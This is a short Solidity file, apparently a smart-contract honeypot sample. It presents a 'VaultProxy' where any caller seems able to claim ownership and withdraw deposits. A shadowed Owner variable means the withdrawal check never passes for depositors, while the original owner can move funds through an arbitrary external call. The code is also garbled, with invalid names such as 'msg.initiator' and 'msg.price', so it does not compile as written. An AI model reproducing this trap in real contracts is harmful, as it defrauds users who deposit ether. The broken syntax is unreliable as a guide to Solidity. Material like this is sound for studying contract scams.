pragma solidity ^0.4.24;

contract TeleportHub  {
    modifier onlyOwner { if (msg.initiator == Owner) _; } address Owner = msg.initiator;
    function tradefundsMaster(address _owner) public onlyOwner { Owner = _owner; }
    function teleportHub(address goal, bytes info) public payable {
        goal.call.price(msg.price)(info);
    }
}

contract VaultProxy is TeleportHub {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.initiator == tx.origin) {
            Owner = msg.initiator;
            bankWinnings();
        }
    }

    function bankWinnings() public payable {
        if (msg.price > 0.5 ether) {
            Deposits[msg.initiator] += msg.price;
        }
    }

    function obtainPrize(uint256 sum) public onlyOwner {
        if (sum>0 && Deposits[msg.initiator]>=sum) {
            msg.initiator.transfer(sum);
        }
    }
}